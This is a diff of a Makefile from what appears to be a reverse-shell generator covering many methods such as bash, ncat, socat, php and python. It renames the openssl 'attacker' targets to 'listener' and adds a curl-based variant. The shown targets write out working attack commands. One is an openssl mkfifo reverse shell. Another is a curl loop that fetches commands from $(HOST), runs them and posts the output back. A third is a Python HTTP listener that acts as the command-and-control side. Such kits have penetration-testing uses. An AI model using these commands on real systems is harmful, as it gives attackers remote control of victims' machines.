@@ -4,7 +4,7 @@ PORT	:= 4444
 PORT2	:= 4445
 TMP	:= /tmp/f
 
-METHODS	:= bash1 bash2 bash3 ksh zsh pwsh ncat1 ncat2 telnet1 telnet2 socket openssl openssl-attacker curl python perl php1 php2 php3 php4 php5 php6 ruby1 ruby2 irb1 irb2 node jrunscript jjs julia socat pip cpan busybox-nc
+METHODS	:= bash1 bash2 bash3 ksh zsh pwsh ncat1 ncat2 telnet1 telnet2 socket openssl openssl-listener curl curl-listener python perl php1 php2 php3 php4 php5 php6 ruby1 ruby2 irb1 irb2 node jrunscript jjs julia socat pip cpan busybox-nc
 
 BOLD		:= \033[1m
 UNDERLINE	:= \033[4m
@@ -142,11 +142,11 @@ openssl:
 openssl-show:
 	@printf "mkfifo $(TMP); $(SHELL) < $(TMP) 2>&1 | openssl s_client -quiet -connect $(HOST):$(PORT) > $(TMP); rm $(TMP)\n"
 
-openssl-attacker:
+openssl-listener:
 	openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -noenc
 	openssl s_server -quiet -key key.pem -cert cert.pem -port $(PORT)
 
-openssl-attacker-show:
+openssl-listener-show:
 	@printf "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -noenc\n"
 	@printf "openssl s_server -quiet -key key.pem -cert cert.pem -port $(PORT)\n"
 
@@ -159,6 +159,12 @@ curl:
 
 curl-show:
 	@printf "while true; do cmd=\$$(curl -s http://$(HOST):$(PORT)); res=\$$($(SHELL) -c \"\$$cmd\" 2>&1); curl -X POST -d \"\$$res\" http://$(HOST):$(PORT); done;\n"
+
+curl-listener:
+	python -c 'from http.server import BaseHTTPRequestHandler,HTTPServer; H=type("H",(BaseHTTPRequestHandler,),{"do_GET":lambda s:(s.send_response(200),s.end_headers(),s.wfile.write(input("[+] Enter command to execute: ").encode())), "do_POST":lambda s:(s.send_response(200),s.end_headers(),print("[+] Command output:\n"+s.rfile.read(int(s.headers["Content-Length"])).decode()))}); HTTPServer(("0.0.0.0",$(PORT)),H).serve_forever()'
+
+curl-listener-show:
+	@printf "python -c 'from http.server import BaseHTTPRequestHandler,HTTPServer; H=type(\"H\",(BaseHTTPRequestHandler,),{\"do_GET\":lambda s:(s.send_response(200),s.end_headers(),s.wfile.write(input(\"[+] Enter command to execute: \").encode())), \"do_POST\":lambda s:(s.send_response(200),s.end_headers(),print(\"[+] Command output:\\\\n\"+s.rfile.read(int(s.headers[\"Content-Length\"])).decode()))}); HTTPServer((\"0.0.0.0\",$(PORT)),H).serve_forever()'\n"
 
 ############################################################
 
